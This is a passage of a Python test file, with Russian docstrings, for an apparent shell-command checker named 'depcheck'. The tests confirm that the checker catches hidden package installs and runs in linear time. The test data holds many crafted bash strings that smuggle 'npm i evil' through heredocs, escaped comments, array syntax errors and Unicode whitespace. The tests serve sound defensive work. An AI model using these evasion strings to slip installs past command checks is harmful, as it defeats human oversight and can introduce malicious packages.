                     lambda n: 'x="$(cat' + " <<E" * n + "\n" + "E" * n + ')\n)"',
                     lambda n: "x=${ cat" + " <<E" * n + "\n" + "E" * n + "}\n}",
                     lambda n: "cat <<X\n${ cat" + " <<E" * n + "\n" + "E" * n + "}\nX",
                     lambda n: "x=${ " + "(" * n + "cat" + " <<E" * n + "\n" + "E)\n" * n + ")" * n + "}",
                     lambda n: "x=${ { " + "(\n" * n + "cat" + " <<E" * n + "\n" + "E}\n" * n + ")" * n + "} }",
                     lambda n: "x=$(cat" + " <<-E" * n + "\n" + "\t" * n + "E" * n + ")\n)\n"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class EscapedBlankCommentTest(unittest.TestCase):
    """`#` за пробельным символом с `\\` перед ним — не комментарий, а часть слова (bash 5.3: `echo \\ #$(…)`
    исполняет подстановку); за `\\\\` и пробелом — комментарий."""

    DETECTED = ["echo \\ #$(npm i evil)", "echo \\\t#$(npm i evil)", "echo $(echo \\ #; npm i evil)",
                'echo "$(echo \\ #)"; npm i evil', "x=\\\n#$(npm i evil)"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_comment(self):
        self.assertIsNone(depcheck.dependency_add("echo \\\\ #$(npm i x)"))
        self.assertIsNone(depcheck.dependency_doubt("echo \\\\ #$(npm i x)"))
        self.assertEqual(depcheck.heredocs("echo \\ #<<E"), [("E", False)])
        self.assertEqual(depcheck.heredocs("echo \\\\ #<<E"), [])

    def test_linear(self):
        for make in [lambda n: "echo " + "\\ #" * n, lambda n: "echo " + "\\" * n + " #$(npm i x)",
                     lambda n: "echo $(" + "\\\\ #\n" * n + ")"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class ArrayAssignmentHeredocTest(unittest.TestCase):
    """Оператор в скобках присваивания массива (`x=(…`, `x+=(`, `a[1]=(`, после `declare`, `local`) — `;`, `&`, `|`,
    перенаправление, `(` не за `<`, `>`, `$` — синтаксическая ошибка bash 5.3: строка отбрасывается целиком вместе с
    телами своих heredoc, следующая строка читается заново командами (в том числе внутри кавычек, подстановок и
    `${ …; }`). `<(…)`, `>(…)` в скобках — процесс-подстановка, heredoc в ней — настоящий."""

    DETECTED = ["x=(<<E\nnpm i evil\nE\n)", "x+=(<<E)\nnpm i evil", "x=( a <<E )\nnpm i evil",
                "declare -a x=(<<E)\nnpm i evil", "local x=(<<E)\nnpm i evil", "a[1]=(<<E)\nnpm i evil",
                "echo $(x=(<<E)\nnpm i evil\n)", "x=(( `cat <<E\nnpm i evil\nE\n`)",
                "x=((a `cat <<E\nnpm i evil\nE\n`))", "x=(a (b) `cat <<E\nnpm i evil\nE\n`)",
                "echo \"${\ttime echo q & x=(1; echo '}' || }\"\nnpm i evil",
                "x=( ; ) <<E\nnpm i evil\nE", "cat <<E; x=( a | b )\nnpm i evil\nE", "x=( a >b ) <<E\nnpm i evil\nE",
                "echo $(x=( a & ) <<E\nnpm i evil\nE\n)", 'echo "$(x=( a ; ) <<E\nnpm i evil\nE\n)"',
                'x=( a <<<b ) "$(cat <<E\nnpm i evil\nE\n)"', "x=( #]\r; #(${\n;; esac`cat <<E\nnpm i evil\n",
                "x=(\n|;; esaccat <<'E'\nnpm i evil", 'x=( a\n(b) "$(cat <<E\nnpm i evil\nE\n)" )',
                "x=(\n<<E\nnpm i evil\nE\n)", 'x=( "a\nb" ; <<E\nnpm i evil\nE\n)']
    # Процесс-подстановка в скобках и heredoc за скобками, закрытыми на следующей строке: тело — данные.
    NOT_ADDS = ["x=( <(cat <<E\nnpm i x\nE\n) )", "x=( >(cat <<E\nnpm i x\nE\n) )",
                'x=( a "$(cat <<E\nnpm i x\nE\n)" )', "x=(\na\n) <<E\nnpm i x\nE"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_heredocs(self):
        self.assertEqual(depcheck.heredocs("x=(<<E"), [])
        self.assertEqual(depcheck.heredocs("x=( $(cat <<E) )"), [("E", False)])
        self.assertEqual(depcheck.heredocs("(cat <<E)"), [("E", False)])
        self.assertEqual(depcheck.heredocs("x=( <(cat <<E) )"), [("E", False)])
        self.assertEqual(depcheck.heredocs("cat <<E; x=( a ; b )"), [])
        self.assertEqual(depcheck.heredocs("x=( a ) <<E"), [("E", False)])

    def test_linear(self):
        for make in [lambda n: "x=" + "(" * n + "<<E" * n, lambda n: "x=(\n" + "(<<E\n" * n,
                     lambda n: "x=( a ;" + " <<E" * n + "\nnpm i x\n" + "E\n" * n,
                     lambda n: 'echo "' + "${ x=(; }" * n + '"\n' + "x=( a ; ) <<E\n" * n]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class WordWhitespaceTest(unittest.TestCase):
    """Разделители слов bash — только пробел, таб и перевод строки: `\\r`, `\\v`, `\\f`, `\\x1c`, неразрывный и
    прочие пробелы Unicode — часть слова (5.3): `X=1\\recho npm i x` — присваивание и команда `npm`, `a\\r#…` — не
    комментарий, `;\\xa0}` в `${ …; }` — слово, не конец тела."""

    DETECTED = ['echo "${ echo;\xa0} ; npm i evil; }"', 'echo "${ echo;\r} ; npm i evil; }"',
                'echo "${ echo;\x0b} ; npm i evil; }"', 'echo "${ echo;\x0c} ; npm i evil; }"',
                'echo "${ echo; } ; npm i evil; }"', "X=1\recho npm i evil", "x=\r\\\n[ npm i evil",
                "echo a\r#$(npm i evil)", "echo a\x0b#$(npm i evil)", "echo a\x0c#$(npm i evil)",
                "echo a\x1c#$(npm i evil)", "echo a\xa0#$(npm i evil)", "echo a #$(npm i evil)",
                'echo "${ echo a\r#; npm i evil; }"', "x=\r\\\n#$(npm i evil)"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_words(self):
        self.assertEqual([w for w, _ in depcheck._split("X=1\recho a")], ["X=1\recho", "a"])
        self.assertEqual(depcheck.heredocs("echo a\r#<<E"), [("E", False)])


class HeredocLineJoinTest(unittest.TestCase):
    """Тело heredoc с терминатором без кавычек bash читает строками, склеенными по `\\` с переводом строки (5.3,
    read_secondary_line: `\\` перед `\\` — пара, перевод строки за ней не снимается); с терминатором сравнивается
    склеенная строка (ведущие табы `<<-` снимаются только в её начале), подстановки ищутся в склеенном теле.
    Терминатор в кавычках — без склейки."""

    DETECTED = ["echo ${ cat <<E\nE\\\n}; npm i evil\nE\n}",
                'echo "${\ncat <<E\n}\nE$ && echo \\\n} & echo $$\n}"\nnpm i evil', "cat <<E\nE\\\n\nnpm i evil",
                "x=$(cat <<E\nE\\\n)\nnpm i evil\nE\n)", "x=$(cat <<E\nE \\\n)\nnpm i evil",
                "cat <<E\n$(echo a #\\\n)\nnpm i evil)\nE",
                'cat <<E\n${| echo "}" || echo a # }; echo \\\n}\nnpm i evil & (echo d) & }; npm i evil\nE',
                "cat <<E\n${\necho fi} & echo #\\\n} || x=1 || echo '}'\nnpm i evil;}\nE",
                "cat <<-E\n\tE\\\n\nnpm i evil", "cat <<-E\n\t\\\n\tE\nnpm i evil", "cat <<EOF\nEO\\\nF\nnpm i evil",
                "x=$(cat <<E\nE)\\\n; npm i evil\nE\n)", "x=$(cat <<E\nE\\\n\\\n)\nnpm i evil\nE\n)",
                'echo "$(cat <<E\nE\\\n)"; npm i evil']
    # Склеенная строка — не терминатор; `\\\\` в конце строки — пара, без склейки; терминатор в кавычках.
    NOT_ADDS = ["cat <<E\nx\\\nE\nnpm i x", "cat <<E\nE\\\nE\nnpm i x", "cat <<'E'\nE\\\n\nnpm i x",
                "cat <<E\nE\\\\\n\nnpm i x", "cat <<E\nE\\\\\\\n\nnpm i x", "cat <<-E\n\tE\\\n\t\nnpm i x",
                "cat <<E\nE\\\n)\nnpm i x"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        for make in [lambda n: "cat <<E\n" + "x\\\n" * n + "E\n", lambda n: "x=$(cat <<E\n" + "E\\\n" * n + ")\n)",
                     lambda n: "cat <<E\n" + "\\" * n + "\nE\n", lambda n: "cat <<E\n" + "$(a #\\\n" * n + "E\n"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))
